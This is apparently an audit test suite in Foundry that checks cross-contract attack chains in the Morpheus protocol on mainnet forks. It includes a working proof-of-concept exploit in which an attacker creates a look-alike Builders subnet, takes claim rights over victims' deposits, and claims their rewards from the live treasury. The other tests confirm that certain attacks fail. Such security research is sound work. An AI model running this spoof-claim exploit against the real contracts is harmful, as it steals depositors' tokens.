// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

interface IERC20G5 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function totalSupply() external view returns (uint256);
}

struct SubnetG5 {
    string name;
    address admin;
    uint128 unused1;
    uint128 withdrawLockPeriodAfterDeposit;
    uint128 unused2;
    uint256 minimalDeposit;
    address claimAdmin;
}

struct SubnetMetadataG5 {
    string slug;
    string description;
    string website;
    string image;
}

struct UserDataG5 {
    uint128 lastDeposit;
    uint128 unused1;
    uint256 deposited;
    uint256 unused2;
}

interface IBuildersV4G5 {
    function createSubnet(SubnetG5 calldata subnet_, SubnetMetadataG5 calldata metadata_) external;
    function deposit(bytes32 subnetId_, uint256 amount_) external;
    function claim(bytes32 subnetId_, address receiver_) external;
    function getSubnetId(string memory subnetName_) external view returns (bytes32);
    function subnets(bytes32 subnetId_)
        external
        view
        returns (string memory, address, uint128, uint128, uint128, uint256, address);
    function usersData(address user_, bytes32 subnetId_) external view returns (UserDataG5 memory);
    function getCurrentSubnetRewards(bytes32 subnetId_) external view returns (uint256);
    function owner() external view returns (address);
    function rewardPool() external view returns (address);
    function buildersTreasury() external view returns (address);
    function feeConfig() external view returns (address);
    function networkShare() external view returns (uint256);
    function networkShareOwner() external view returns (address);
    function allSubnetsData() external view returns (uint256, uint256, uint256, uint256);
    function allSubnetsDataV4() external view returns (uint256, uint256, uint256, uint128);
    function setRewardPool(address) external;
    function setBuildersTreasury(address) external;
    function setFeeConfig(address) external;
    function setNetworkShare(uint256) external;
}

interface IBuildersTreasuryV2G5 {
    function owner() external view returns (address);
    function rewardToken() external view returns (address);
    function builders() external view returns (address);
    function distributedRewards() external view returns (uint256);
    function withdraw(address receiver_, uint256 amount_) external;
}

interface IRewardPoolG5 {
    function owner() external view returns (address);
    function getPeriodRewards(uint256 index_, uint128 startTime_, uint128 endTime_)
        external
        view
        returns (uint256);
}

interface IFeeConfigG5 {
    function owner() external view returns (address);
    function getFeeAndTreasuryForOperation(address sender_, bytes32 operation_)
        external
        view
        returns (uint256, address);
}

struct SendParamG5 {
    uint32 dstEid;
    bytes32 to;
    uint256 amountLD;
    uint256 minAmountLD;
    bytes extraOptions;
    bytes composeMsg;
    bytes oftCmd;
}

struct MessagingFeeG5 {
    uint256 nativeFee;
    uint256 lzTokenFee;
}

interface IMOROFTG5 {
    function mint(address account_, uint256 amount_) external;
    function isMinter(address) external view returns (bool);
    function owner() external view returns (address);
    function quoteSend(SendParamG5 calldata _sendParam, bool _payInLzToken)
        external
        view
        returns (MessagingFeeG5 memory);
}

interface IDiamondLoupeG5 {
    struct Facet {
        address facetAddress;
        bytes4[] functionSelectors;
    }

    function facets() external view returns (Facet[] memory);
}

interface ILumerinDiamondG5 {
    function owner() external view returns (address);
    function withdrawFee(address recipient_, uint256 amount_) external;
}

struct UserDataCapG5 {
    uint128 lastStake;
    uint256 deposited;
    uint256 rate;
    uint256 pendingRewards;
    uint128 claimLockStart;
    uint128 claimLockEnd;
    uint256 virtualDeposited;
    uint128 lastClaim;
}

interface IPoolCapG5 {
    function stake(uint256 rewardPoolIndex_, uint256 amount_, uint128 claimLockEnd_, address referrer_)
        external;
    function usersData(address, uint256) external view returns (UserDataCapG5 memory);
    function getLatestUserReward(uint256, address) external view returns (uint256);
    function rewardPoolsData(uint256)
        external
        view
        returns (uint128 lastUpdate, uint256 rate, uint256 totalVirtualDeposited);
    function rewardPoolsProtocolDetails(uint256)
        external
        view
        returns (uint128, uint128, uint128, uint256, uint256);
}

interface IDistributorG5 {
    function rewardPool() external view returns (address);
    function l1Sender() external view returns (address);
    function rewardPoolLastCalculatedTimestamp(uint256) external view returns (uint128);
    function distributeRewards(uint256 rewardPoolIndex_) external;
    function getDistributedRewards(uint256, address) external view returns (uint256);
    function undistributedRewards() external view returns (uint256);
    function withdrawUndistributedRewards(address user_, address refundTo_) external payable;
    function sendMintMessage(uint256 rewardPoolIndex_, address user_, uint256 amount_, address refundTo_)
        external
        payable;
}

struct LayerZeroConfigG5 {
    address gateway;
    address receiver;
    uint16 receiverChainId;
    address zroPaymentAddress;
    bytes adapterParams;
}

interface IL1SenderV2G5 {
    function owner() external view returns (address);
    function distributor() external view returns (address);
    function layerZeroConfig() external view returns (LayerZeroConfigG5 memory);
    function sendWstETH(uint256 gasLimit_, uint256 maxFeePerGas_, uint256 maxSubmissionCost_)
        external
        payable
        returns (bytes memory);
}

interface IAggregatorG5 {
    function latestRoundData()
        external
        view
        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound);
}

/// @title Morpheus — cross-contract chains (Builders x Capital x Lumerin x MOR)
/// @notice Every chain is tested on a pinned mainnet fork; a chain without a
///         passing test asserting a loss is NOT a finding. Forks: ETH 26391516,
///         Base 56038769. Attacker = fresh unprivileged address everywhere.
contract PocG5cCrossContractTest is Test {
    uint256 constant ETH_BLOCK = 26391516;
    uint256 constant BASE_BLOCK = 56038769;

    address constant MULTISIG = 0x1FE04BC15Cf2c5A2d41a0b3a96725596676eBa1E;

    // Base
    address constant BUILDERS_V4 = 0x42BB446eAE6dca7723a9eBdb81EA88aFe77eF4B9;
    address constant TREASURY = 0x9eba628581896ce086cb8f1A513ea6097A8FC561;
    address constant REWARD_POOL_BASE = 0xDC99a8596e395E52aba2BD08C623E1e428Dc3980;
    address constant FEE_CONFIG = 0x845FBB4B3e2207BF03087b8B94D2430AB11088eE;
    address constant MOR_BASE = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;
    address constant LUMERIN_DIAMOND = 0x6aBE1d282f72B474E54527D93b979A4f64d3030a;
    address constant PROVIDER_REGISTRY = 0xE30279b79392AEfF7fDf1883C23d52eBA9D88A75;
    address constant MODEL_REGISTRY = 0xb7994dE339AEe515C9b2792831CD83f3C9D8df87;
    address constant MARKETPLACE = 0x5B660aB78f3AC743953F9E68630A2D66e7b45F64;
    address constant DELEGATION = 0x345B8B23c38F70f1d77560C60493Bb583f012Cb0;
    address constant SESSION_ROUTER = 0x3a3952F0e57B343F00B31f7da039Ef16389B7260;

    // ETH
    address constant DISTRIBUTOR = 0xDf1AC1AC255d91F5f4B1E3B4Aef57c5350F64C7A;
    address constant POOL_STETH = 0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790;
    address constant STETH = 0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84;
    address constant REWARD_POOL_ETH = 0xb7994dE339AEe515C9b2792831CD83f3C9D8df87;
    address constant L1_SENDER_V2 = 0x2Efd4430489e1a05A89c2f51811aC661B7E5FF84;
    address constant L2_MESSAGE_RECEIVER = 0xd4a8ECcBe696295e68572A98b1aA70Aa9277d427;
    address constant CURVE_STETH_POOL = 0xDC24316b9AE028F1497c275EB9192a3Ea0f67022;

    // Chainlink feeds (mocked fresh after warp, G4-C pattern)
    address constant FEED_STETH_USD = 0xCfE54B5cD566aB89272946F602D76Ea879CAb4a8;
    address constant FEED_WETH_USD = 0x5f4eC3Df9cbd43714FE2740f5E3616155c5b8419;
    address constant FEED_WBTC_BTC = 0xfdFD9C85aD200c506Cf9e21F1FD8dd01932FBB23;
    address constant FEED_BTC_USD = 0xF4030086522a5bEEa4988F8cA5B36dbC97BeE88c;
    address constant FEED_USDC_USD = 0x8fFfFfd4AfB6115b954Bd326cbe7B4BA576818f6;
    address constant FEED_USDT_USD = 0x3E7d1eAB13ad0104d2750B8863b489D65364e32D;

    uint256 constant DAY = 86400;
    uint256 constant MIN_LOCK = 604800; // 7 days, live minimalWithdrawLockPeriod
    uint256 constant PRECISION = 1e25;

    address attacker;
    address legit;
    address victim1;
    address victim2;
    address victim3;
    address staker;

    // T5 measurement slots (storage, not locals: avoids stack-too-deep).
    uint256 private _c5DistributedBefore;
    uint256 private _c5StethBefore;
    uint256 private _c5UndistributedBefore;
    uint128 private _c5LastCalcSetup;

    // Index-0 DepositPools (all five share ETH RewardPool bucket 0; the
    // 30d schedule is split across them by yield weight, so a single pool
    // takes only its share -- the TOTAL is what the schedule bounds).
    // Verified live: depositPoolAddresses(0, 0..4) at ETH block 26391516.
    address constant POOL_WBTC = 0xdE283F8309Fd1AA46c95d299f6B8310716277A42;
    address constant POOL_WETH = 0x9380d72aBbD6e0Cc45095A2Ef8c2CA87d77Cb384;
    address constant POOL_USDC = 0x6cCE082851Add4c535352f596662521B4De4750E;
    address constant POOL_USDT = 0x3B51989212BEdaB926794D6bf8e9E991218cf116;

    function _totalDistributedRewards() internal view returns (uint256 total) {
        total += IDistributorG5(DISTRIBUTOR).getDistributedRewards(0, POOL_STETH);
        total += IDistributorG5(DISTRIBUTOR).getDistributedRewards(0, POOL_WBTC);
        total += IDistributorG5(DISTRIBUTOR).getDistributedRewards(0, POOL_WETH);
        total += IDistributorG5(DISTRIBUTOR).getDistributedRewards(0, POOL_USDC);
        total += IDistributorG5(DISTRIBUTOR).getDistributedRewards(0, POOL_USDT);
    }

    function _baseFork() internal {
        vm.createSelectFork("base", BASE_BLOCK);
    }

    function _ethFork() internal {
        vm.createSelectFork("eth", ETH_BLOCK);
    }

    function _baseSetUp() internal {
        _baseFork();
        attacker = makeAddr("attacker");
        legit = makeAddr("legitBuilder");
        victim1 = makeAddr("victim1");
        victim2 = makeAddr("victim2");
        victim3 = makeAddr("victim3");
        staker = makeAddr("staker");
        vm.deal(attacker, 10 ether);
        vm.deal(legit, 10 ether);
        vm.deal(victim1, 10 ether);
        vm.deal(victim2, 10 ether);
        vm.deal(victim3, 10 ether);
        vm.deal(staker, 10 ether);
        deal(MOR_BASE, attacker, 100_000 ether);
        deal(MOR_BASE, legit, 100_000 ether);
        deal(MOR_BASE, victim1, 100_000 ether);
        deal(MOR_BASE, victim2, 100_000 ether);
        deal(MOR_BASE, victim3, 100_000 ether);
        deal(MOR_BASE, staker, 100_000 ether);
    }

    function _mkSubnet(string memory name, address admin, address claimAdmin, uint256 lock)
        internal
        pure
        returns (SubnetG5 memory)
    {
        return SubnetG5({
            name: name,
            admin: admin,
            unused1: 0,
            withdrawLockPeriodAfterDeposit: uint128(lock),
            unused2: 0,
            minimalDeposit: 1 ether,
            claimAdmin: claimAdmin
        });
    }

    function _mkMeta() internal pure returns (SubnetMetadataG5 memory) {
        return SubnetMetadataG5({slug: "g5c", description: "g5c", website: "https://example.com", image: ""});
    }

    function _create(string memory name, address admin, address claimAdmin, uint256 lock, address caller)
        internal
        returns (bytes32 id)
    {
        id = IBuildersV4G5(BUILDERS_V4).getSubnetId(name);
        vm.prank(caller);
        IBuildersV4G5(BUILDERS_V4).createSubnet(_mkSubnet(name, admin, claimAdmin, lock), _mkMeta());
    }

    function _deposit(address who, bytes32 id, uint256 amount) internal {
        vm.prank(who);
        IERC20G5(MOR_BASE).approve(BUILDERS_V4, amount);
        vm.prank(who);
        IBuildersV4G5(BUILDERS_V4).deposit(id, amount);
    }

    /// @notice Replays the G1-V1 spoof and returns the stolen amount.
    function _runSpoofClaim() internal returns (uint256 stolen) {
        _create("RealBuilder", legit, legit, MIN_LOCK, legit);
        bytes32 spoofId = _create("RealBuilderPro", legit, attacker, MIN_LOCK, attacker);
        _deposit(victim1, spoofId, 50_000 ether);
        _deposit(victim2, spoofId, 30_000 ether);
        _deposit(victim3, spoofId, 20_000 ether);
        vm.warp(block.timestamp + 30 days);
        uint256 attackerBefore = IERC20G5(MOR_BASE).balanceOf(attacker);
        vm.prank(attacker);
        IBuildersV4G5(BUILDERS_V4).claim(spoofId, attacker);
        stolen = IERC20G5(MOR_BASE).balanceOf(attacker) - attackerBefore;
    }

    // ------------------------------------------------------------------
    // C1 — Shared emission budget: does a spoofed Builders claim drain or
    // dilute Capital stakers? The Builders pot is the finite treasury
    // balance; Capital mints fresh MOR per schedule. Measure both pots.
    // ------------------------------------------------------------------
    function test_C5C_1_SpoofClaimDrainsTreasuryOnly() public {
        _baseSetUp();

        uint256 treasuryBefore = IERC20G5(MOR_BASE).balanceOf(TREASURY);
        uint256 supplyBefore = IERC20G5(MOR_BASE).totalSupply();
        // Fixed 30d window: the schedule is pure time math, so the same
        // window must return the same value before and after the claim.
        uint128 t0 = uint128(block.timestamp);
        uint256 bucket3_30d = IRewardPoolG5(REWARD_POOL_BASE).getPeriodRewards(3, t0, t0 + 30 days);
        uint256 networkShare = IBuildersV4G5(BUILDERS_V4).networkShare();
        (uint256 feePart, address feeTreasury) =
            IFeeConfigG5(FEE_CONFIG).getFeeAndTreasuryForOperation(BUILDERS_V4, bytes32("claim"));

        uint256 stolen = _runSpoofClaim();

        uint256 treasuryAfter = IERC20G5(MOR_BASE).balanceOf(TREASURY);
        uint256 supplyAfter = IERC20G5(MOR_BASE).totalSupply();
        uint256 bucket3_30dAfter =
            IRewardPoolG5(REWARD_POOL_BASE).getPeriodRewards(3, t0, t0 + 30 days);

        // The claim is paid 1:1 out of the finite treasury pot, no mint.
        assertGt(stolen, 1_000 ether, "spoof must steal material yield");
        assertEq(treasuryBefore - treasuryAfter, stolen, "treasury delta == stolen");
        assertEq(supplyAfter, supplyBefore, "no MOR minted by the claim");
        // The schedule is pure time math: a claim cannot change it.
        assertEq(bucket3_30dAfter, bucket3_30d, "bucket-3 schedule unchanged by claim");
        // Live claim fee is zero, so the whole pending goes to the receiver.
        assertEq(feePart, 0, "live claim fee is 0");
        emit log_named_uint("C1 stolen MOR (wei)", stolen);
        emit log_named_uint("C1 treasury before (wei)", treasuryBefore);
        emit log_named_uint("C1 treasury after (wei)", treasuryAfter);
        emit log_named_uint("C1 bucket3 30d schedule (wei)", bucket3_30d);
        // Treasury runway at the current Builders emission rate, in days.
        uint256 dailyBuilders = (bucket3_30d * networkShare) / PRECISION / 30;
        emit log_named_uint("C1 treasury runway (days)", treasuryAfter / dailyBuilders);
        emit log_named_address("C1 claim fee treasury", feeTreasury);
    }

    // ------------------------------------------------------------------
    // C2 — Amplification INSIDE Builders: the spoof's deposits raise
    // totalDeposited, diluting the reward rate for every legit subnet.
    // Same legit subnet, same 100k stake, same 30d warp — with and
    // without the spoof. The difference is the dilution loss.
    // ------------------------------------------------------------------
    function test_C5C_2a_LegitYieldWithoutSpoof() public {
        _baseSetUp();
        bytes32 legitId = _create("RealBuilder", legit, legit, MIN_LOCK, legit);
        _deposit(staker, legitId, 100_000 ether);
        vm.warp(block.timestamp + 30 days);
        uint256 pending = IBuildersV4G5(BUILDERS_V4).getCurrentSubnetRewards(legitId);
        assertGt(pending, 1_000 ether, "legit subnet must accrue material yield");
        emit log_named_uint("C2a legit pending, no spoof (wei)", pending);
    }

    function test_C5C_2b_LegitYieldWithSpoof() public {
        _baseSetUp();
        bytes32 legitId = _create("RealBuilder", legit, legit, MIN_LOCK, legit);
        _deposit(staker, legitId, 100_000 ether);
        bytes32 spoofId = _create("RealBuilderPro", legit, attacker, MIN_LOCK, attacker);
        _deposit(victim1, spoofId, 50_000 ether);
        _deposit(victim2, spoofId, 30_000 ether);
        _deposit(victim3, spoofId, 20_000 ether);
        vm.warp(block.timestamp + 30 days);
        uint256 pending = IBuildersV4G5(BUILDERS_V4).getCurrentSubnetRewards(legitId);
        assertGt(pending, 1_000 ether, "legit subnet must accrue material yield");
        emit log_named_uint("C2b legit pending, with spoof (wei)", pending);
    }

    // ------------------------------------------------------------------
    // C3 — Shared roles: no unprivileged role earned in one system
    // unlocks anything in another. All owners are the one multisig.
    // ------------------------------------------------------------------
    function test_C5C_3_RolesDoNotCrossSystems() public {
        _baseSetUp();

        // Owners: one multisig everywhere (out-of-scope address itself).
        assertEq(IBuildersV4G5(BUILDERS_V4).owner(), MULTISIG, "BuildersV4 owner");
        assertEq(IBuildersTreasuryV2G5(TREASURY).owner(), MULTISIG, "Treasury owner");
        assertEq(IFeeConfigG5(FEE_CONFIG).owner(), MULTISIG, "FeeConfig owner");
        assertEq(IRewardPoolG5(REWARD_POOL_BASE).owner(), MULTISIG, "Base RewardPool owner");
        assertEq(ILumerinDiamondG5(LUMERIN_DIAMOND).owner(), MULTISIG, "Diamond owner");
        // networkShareOwner is zero: setNetworkShare is owner-only in practice.
        assertEq(IBuildersV4G5(BUILDERS_V4).networkShareOwner(), address(0));

        // A subnet admin (privileged inside Builders) has no power anywhere else.
        vm.prank(legit);
        vm.expectRevert();
        IBuildersV4G5(BUILDERS_V4).setRewardPool(REWARD_POOL_BASE);
        vm.prank(legit);
        vm.expectRevert();
        IBuildersV4G5(BUILDERS_V4).setBuildersTreasury(TREASURY);
        vm.prank(legit);
        vm.expectRevert();
        IBuildersV4G5(BUILDERS_V4).setFeeConfig(FEE_CONFIG);
        vm.prank(legit);
        vm.expectRevert();
        IBuildersV4G5(BUILDERS_V4).setNetworkShare(0);

        // Attacker cannot touch the treasury or the diamond's fee pot.
        vm.prank(attacker);
        vm.expectRevert();
        IBuildersTreasuryV2G5(TREASURY).withdraw(attacker, 1 ether);
        vm.prank(attacker);
        vm.expectRevert();
        ILumerinDiamondG5(LUMERIN_DIAMOND).withdrawFee(attacker, 1 ether);

        // The diamond's facets are exactly the 5 known ones; none is a
        // Builders contract, so no facet shares code with Builders. Note:
        // the ModelRegistry facet address 0xb799... coincides with the ETH
        // RewardPool address — same address on a different chain, different
        // contract (scope.md Ambiguitas 2). The check below is per-chain.
        IDiamondLoupeG5.Facet[] memory facets = IDiamondLoupeG5(LUMERIN_DIAMOND).facets();
        assertEq(facets.length, 5, "diamond has 5 facets");
        for (uint256 i = 0; i < facets.length; i++) {
            address f = facets[i].facetAddress;
            assertTrue(
                f == PROVIDER_REGISTRY || f == MODEL_REGISTRY || f == MARKETPLACE || f == DELEGATION
                    || f == SESSION_ROUTER,
                "facet is one of the 5 known facets"
            );
            assertTrue(f != BUILDERS_V4 && f != TREASURY && f != FEE_CONFIG && f != REWARD_POOL_BASE,
                "no facet is a Builders contract");
        }
    }

    // ------------------------------------------------------------------
    // C4 — MOR double-claim across chains: a Builders claim pays real MOR
    // from the treasury (conservation, no mint); the OFT burn on send
    // means the same MOR cannot be claimed again elsewhere.
    // ------------------------------------------------------------------
    function test_C5C_4_NoDoubleClaimAcrossChains() public {
        _baseSetUp();
        vm.deal(attacker, 10 ether);

        uint256 treasuryBefore = IERC20G5(MOR_BASE).balanceOf(TREASURY);
        uint256 supplyBefore = IERC20G5(MOR_BASE).totalSupply();
        uint256 stolen = _runSpoofClaim();
        assertEq(IERC20G5(MOR_BASE).balanceOf(TREASURY), treasuryBefore - stolen, "treasury -stolen");
        assertEq(IERC20G5(MOR_BASE).totalSupply(), supplyBefore, "supply unchanged by claim");

        // Attacker cannot mint MOR on Base (D4 H4, re-asserted in chain context).
        vm.prank(attacker);
        vm.expectRevert("MOROFT: invalid caller");
        IMOROFTG5(MOR_BASE).mint(attacker, 1_000_000 ether);
        assertEq(IERC20G5(MOR_BASE).totalSupply(), supplyBefore, "supply still unchanged");

        // OFT send to Arbitrum: the debit burns on Base. Either the send
        // executes (balance and supply both drop by the sent amount) or it
        // reverts (nothing moves). In neither case are tokens created.
        SendParamG5 memory param = SendParamG5({
            dstEid: 30110,
            to: bytes32(uint256(uint160(attacker))),
            amountLD: 1 ether,
            minAmountLD: 1 ether,
            extraOptions: "",
            composeMsg: "",
            oftCmd: ""
        });
        MessagingFeeG5 memory fee = IMOROFTG5(MOR_BASE).quoteSend(param, false);
        uint256 balBefore = IERC20G5(MOR_BASE).balanceOf(attacker);
        uint256 supBeforeSend = IERC20G5(MOR_BASE).totalSupply();
        (bool ok,) = address(MOR_BASE).call{value: fee.nativeFee}(
            abi.encodeWithSelector(
                bytes4(keccak256("send((uint32,bytes32,uint256,uint256,bytes,bytes,bytes),(uint256,uint256),address)")),
                param,
                fee,
                attacker
            )
        );
        if (ok) {
            assertEq(IERC20G5(MOR_BASE).balanceOf(attacker), balBefore - 1 ether, "OFT debit burns");
            assertEq(IERC20G5(MOR_BASE).totalSupply(), supBeforeSend - 1 ether, "supply drops by sent");
        } else {
            assertEq(IERC20G5(MOR_BASE).balanceOf(attacker), balBefore, "reverted send moves nothing");
            assertEq(IERC20G5(MOR_BASE).totalSupply(), supBeforeSend, "reverted send mints nothing");
        }
        emit log_named_uint("C4 OFT send executed (1=yes)", ok ? 1 : 0);
        emit log_named_uint("C4 stolen MOR (wei)", stolen);
    }

    // ------------------------------------------------------------------
    // C5 — Capital rewards are bounded by the ETH schedule + yield only.
    // No input comes from Base: the Distributor points at the ETH
    // RewardPool, and the only LZ destination is Arbitrum (chain 110).
    // ------------------------------------------------------------------
    function test_C5C_5_CapitalRewardsIndependentOfBuilders() public {
        _ethFork();
        address stakerEth = makeAddr("stakerEth");
        vm.deal(stakerEth, 10 ether);

        // Config: every pointer stays on ETH/Arb; nothing points at Base.
        assertEq(IDistributorG5(DISTRIBUTOR).rewardPool(), REWARD_POOL_ETH, "Distributor->ETH RewardPool");
        assertEq(IDistributorG5(DISTRIBUTOR).l1Sender(), L1_SENDER_V2, "Distributor->L1SenderV2");
        assertEq(IL1SenderV2G5(L1_SENDER_V2).distributor(), DISTRIBUTOR, "L1Sender->Distributor");
        // NOTE: decoding layerZeroConfig() through an interface struct
        // reverts on this fork (verified with a minimal probe); the raw
        // return decodes fine via abi.decode, so read it that way.
        (bool ok, bytes memory ret) =
            L1_SENDER_V2.staticcall(abi.encodeWithSignature("layerZeroConfig()"));
        assertTrue(ok, "layerZeroConfig call ok");
        (, address lzReceiver, uint16 lzChainId) = abi.decode(ret, (address, address, uint16));
        assertEq(lzReceiver, L2_MESSAGE_RECEIVER, "LZ receiver is Arb L2MessageReceiver");
        assertEq(uint256(lzChainId), 110, "LZ destination is Arbitrum (110), not Base (184)");

        // Fund the staker with stETH from the Curve pool (G4-C pattern).
        vm.prank(CURVE_STETH_POOL);
        IERC20G5(STETH).transfer(stakerEth, 15 ether);
        vm.prank(stakerEth);
        IERC20G5(STETH).approve(DISTRIBUTOR, type(uint256).max);
        _mockFeedsFresh();

        // Total emission is measured across ALL FIVE index-0 pools (stETH,
        // wBTC, wETH, USDC, USDT share bucket 0 by yield weight), plus the
        // undistributed pot: the schedule bounds the SUM, not one pool.
        _c5DistributedBefore = _totalDistributedRewards();
        _c5StethBefore = IDistributorG5(DISTRIBUTOR).getDistributedRewards(0, POOL_STETH);
        _c5UndistributedBefore = IDistributorG5(DISTRIBUTOR).undistributedRewards();
        // The distribution clock is the Distributor's
        // rewardPoolLastCalculatedTimestamp, NOT the pool's lastUpdate.
        _c5LastCalcSetup = IDistributorG5(DISTRIBUTOR).rewardPoolLastCalculatedTimestamp(0);

        // Stake first (its internal distribution splits the pre-window
        // schedule across the five pools by their live yields).
        vm.prank(stakerEth);
        IPoolCapG5(POOL_STETH).stake(0, 14 ether, 0, address(0));
        uint128 t0 = uint128(block.timestamp);

        // THEN donate: fresh stETH yield for the next distribution.
        vm.prank(stakerEth);
        IERC20G5(STETH).transfer(DISTRIBUTOR, 0.5 ether);

        vm.warp(block.timestamp + 30 days);
        _mockFeedsFresh();
        IDistributorG5(DISTRIBUTOR).distributeRewards(0);

        uint256 distributedDelta = _totalDistributedRewards() - _c5DistributedBefore;
        uint256 stethDelta =
            IDistributorG5(DISTRIBUTOR).getDistributedRewards(0, POOL_STETH) - _c5StethBefore;
        uint256 undistributedDelta =
            IDistributorG5(DISTRIBUTOR).undistributedRewards() - _c5UndistributedBefore;
        // The 30d window that carried yield (t0 -> now).
        uint256 cap30d = IRewardPoolG5(REWARD_POOL_ETH).getPeriodRewards(0, t0, uint128(block.timestamp));
        // The full window since the last on-chain calculation.
        uint256 capFull = IRewardPoolG5(REWARD_POOL_ETH).getPeriodRewards(
            0, _c5LastCalcSetup, uint128(block.timestamp)
        );
        uint256 pending = IPoolCapG5(POOL_STETH).getLatestUserReward(0, stakerEth);

        // Total Capital emission over the window equals the ETH schedule
        // amount (within 1 day of decay tolerance): the schedule is split
        // across the five index-0 pools by yield weight, so one pool takes
        // only its share -- the sum is what the schedule bounds. No Base
        // input exists anywhere in this accounting.
        emit log_named_uint("C5 total distributed delta (wei)", distributedDelta);
        emit log_named_uint("C5 stETH pool delta (wei)", stethDelta);
        emit log_named_uint("C5 undistributed delta (wei)", undistributedDelta);
        emit log_named_uint("C5 schedule cap full (wei)", capFull);
        emit log_named_uint("C5 schedule cap 30d (wei)", cap30d);
        emit log_named_uint("C5 staker pending (wei)", pending);
        assertGt(distributedDelta, 0, "distribution happened");
        assertGe(
            distributedDelta + undistributedDelta,
            capFull - 3456 ether,
            "total emission >= schedule - 1 day"
        );
        assertLe(
            distributedDelta + undistributedDelta,
            capFull + 3456 ether,
            "total emission <= schedule + 1 day"
        );
        assertGt(pending, 10 ether, "staker has material pending rewards");
    }

    // ------------------------------------------------------------------
    // C6 — No permissionless Capital action can touch Builders state:
    // every privileged Capital function reverts for an attacker, and the
    // only cross-chain sender points at Arbitrum, never Base.
    // ------------------------------------------------------------------
    function test_C5C_6_CapitalCannotTouchBuilders() public {
        _ethFork();
        attacker = makeAddr("attacker");
        vm.deal(attacker, 10 ether);

        vm.prank(attacker);
        vm.expectRevert();
        IDistributorG5(DISTRIBUTOR).sendMintMessage{value: 0.1 ether}(0, attacker, 1_000_000 ether, attacker);

        vm.prank(attacker);
        vm.expectRevert();
        IDistributorG5(DISTRIBUTOR).withdrawUndistributedRewards(attacker, attacker);

        vm.prank(attacker);
        vm.expectRevert();
        IL1SenderV2G5(L1_SENDER_V2).sendWstETH(200_000, 1 gwei, 1);
    }

    function _mockFeedsFresh() internal {
        uint256 ts = block.timestamp - 60;
        _mockFeed(FEED_STETH_USD, 36893488147419126742, 205495608034, ts);
        _mockFeed(FEED_WETH_USD, 129127208515966896904, 205930106386, ts);
        _mockFeed(FEED_WBTC_BTC, 36893488147419104089, 99950000, ts);
        _mockFeed(FEED_BTC_USD, 129127208515966887235, 7395663995243, ts);
        _mockFeed(FEED_USDC_USD, 73786976294838206525, 99968041, ts);
        _mockFeed(FEED_USDT_USD, 73786976294838206522, 99876000, ts);
    }

    function _mockFeed(address feed, uint80 roundId, int256 answer, uint256 ts) internal {
        vm.mockCall(
            feed,
            abi.encodeWithSelector(IAggregatorG5.latestRoundData.selector),
            abi.encode(roundId, answer, ts, ts, roundId)
        );
    }
}
